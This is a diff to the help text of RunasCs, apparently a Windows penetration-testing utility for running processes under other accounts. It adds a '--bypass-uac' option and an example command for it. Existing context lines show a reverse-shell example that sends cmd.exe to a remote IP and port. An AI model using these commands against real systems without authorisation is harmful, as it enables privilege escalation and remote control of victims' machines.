@@ -1520,7 +1520,7 @@ public static class RunasCsMainClass
 RunasCs v1.3 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile] [--bypass-uac]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -1568,6 +1568,10 @@ Optional arguments:
                             Compatible only with -f flags:
                                 1 - CreateProcessWithTokenW
                                 2 - CreateProcessWithLogonW
+    -b, --bypass-uac     
+                            if this flag is specified RunasCs will try a UAC
+                            bypass to spawn a process without token limitation
+                            (not filtered).
 
 Examples:
     Run a command as a specific local user
@@ -1580,6 +1584,8 @@ Examples:
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe 
         RunasCs.exe user1 password1 whoami -d domain -l 9
+	Run a command as an Administrator bypassing UAC
+        RunasCs.exe adm1 password1 ""whoami /all"" --bypass-uac
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
